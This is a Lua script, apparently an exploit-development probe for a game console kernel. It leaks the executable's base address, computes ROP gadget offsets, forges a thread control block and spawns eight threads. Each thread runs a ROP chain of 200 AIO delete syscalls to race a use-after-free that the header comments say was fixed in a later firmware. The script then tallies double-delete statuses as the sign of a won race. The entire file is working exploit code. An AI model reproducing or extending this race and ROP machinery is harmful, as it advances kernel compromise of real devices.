-- CRASH_CLASS: HIGH
-- PROBE 523b: AIO delete race, sustained multi-child overlap
--
-- Context: 523a proved the native-thread delete path works (one 0 and two
-- 0x80020003 per iteration, 300 iterations, no anomaly) but the three
-- children start ~1 ms apart, so they never overlap inside the kernel: the
-- losers fail at the FIRST lookup (slot already removed), which is the
-- 0x80020003 status. The 14.20 fix text describes the window after the
-- first unlock: the delete re-looks-up the object and frees its sub-objects,
-- so a racing thread that frees and reallocates the slot makes 14.10 free
-- the sub-objects of the attacker-swapped object.
--
-- This probe gives each child a LONG chain of deletes (one per id) so the
-- children are guaranteed to interleave mid-run instead of racing only at
-- their start. 8 children x 200 ids = 1600 delete attempts per wave, each
-- with its own unlock/re-lookup window.
--
-- Signature of a won race: two children report status 0 for the SAME id
-- (the object was deleted twice), or a status outside the known set, or the
-- process dies during the wave.

print("=== PROBE 523b: AIO DELETE RACE, SUSTAINED ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- [A] eboot + gadgets
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
print("[A] fake TCB ready")

if not alive() then print("DEAD after setup"); return end

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

-- [B] create N requests, poll each to the deletable state
local IDS = 200
local KIDS = 8
local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local ids_buf = memory.alloc(IDS * 4 + 64)
local poll_out = memory.alloc(0x40)

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    local cell = memory.alloc(16)
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end

print("")
print(string.format("[B] creating %d polled requests", IDS))
local made = {}
for i = 1, IDS do
    local id = create_polled()
    if id == nil then break end
    made[#made + 1] = id
    wd(N(ids_buf) + (i - 1) * 4, id)
end
print(string.format("    created=%d first=%s last=%s", #made,
    tostring(made[1]), tostring(made[#made])))
if #made < IDS then print("    short create; aborting"); return end
if not alive() then print("DEAD while creating"); return end

-- [C] build KIDS children, each deleting every id once
print("")
print(string.format("[C] building %d children x %d deletes", KIDS, IDS))
local status_bytes = IDS * 4
local pars, tids, stats = {}, {}, {}
for c = 1, KIDS do
    local status = memory.alloc(status_bytes + 64)
    for i = 0, status_bytes - 4, 4 do wd(N(status) + i, 0xCCCCCCCC) end

    local stk = memory.alloc(0x6000)
    local sb = N(stk)
    local ss = 0x6000
    local raw_top = sb + ss
    local rsp = raw_top - (raw_top % 16) - 8

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)
    for i = 0, IDS - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + i * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(N(status) + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    pars[c] = par
    tids[c] = tid_ptr
    stats[c] = status
end
print("    chains built")

-- [D] launch all children back to back
print("")
print("[D] launching")
for c = 1, KIDS do
    pcall(function() sc_thr_new(pars[c], uint64(0x38)) end)
end

-- [E] wait for completion
local spins = 0
while spins < 300000 do
    local done = 0
    for c = 1, KIDS do
        if rd(N(stats[c]) + (IDS - 1) * 4) ~= -858993460 then done = done + 1 end
    end
    if done == KIDS then break end
    spins = spins + 1
end
print(string.format("[E] wait spins=%d alive=%s", spins, tostring(alive())))

-- [F] tally
print("")
print("[F] TALLY")
local double_zero = 0
local other_status = 0
local zero_counts = {}
local examples = {}
for i = 0, IDS - 1 do
    local z = 0
    local vals = {}
    for c = 1, KIDS do
        local v = rd(N(stats[c]) + i * 4)
        vals[#vals + 1] = v
        if v == 0 then z = z + 1 end
        if v ~= nil and v ~= 0 and v ~= -2147352576 and v ~= 0x80020003 and v ~= 0x80020010 and v ~= -858993460 then
            other_status = other_status + 1
            if #examples < 4 then
                examples[#examples + 1] = string.format("id %d child %d status %08X", made[i + 1], c, v)
            end
        end
    end
    zero_counts[z] = (zero_counts[z] or 0) + 1
    if z >= 2 then
        double_zero = double_zero + 1
        if #examples < 8 then
            local hex = {}
            for c = 1, #vals do hex[c] = string.format("%08X", vals[c] or 0) end
            examples[#examples + 1] = string.format("id %d: %s", made[i + 1], table.concat(hex, " "))
        end
    end
end
print("    distribution of zero-status counts per id:")
for z = 0, KIDS do
    if zero_counts[z] then print(string.format("      %d zero(s): %d ids", z, zero_counts[z])) end
end
print(string.format("    ids with >=2 zero statuses: %d", double_zero))
print(string.format("    unexpected status values: %d", other_status))
for i = 1, #examples do print("    " .. examples[i]) end

-- [G] health check
if alive() then
    local okc, clean = 0, 0
    for i = 1, 8 do
        local x = create_polled()
        if x ~= nil then
            okc = okc + 1
            local cell = memory.alloc(16)
            wd(N(cell), x)
            local st = memory.alloc(16)
            wd(N(st), 0xCCCCCCCC)
            local dok = pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
            if dok and rd(N(st)) == 0 then clean = clean + 1 end
        end
    end
    print(string.format("[G] fresh create after storm: created=%d clean-deletes=%d", okc, clean))
end

print("")
print("=== PROBE 523b COMPLETE ===")
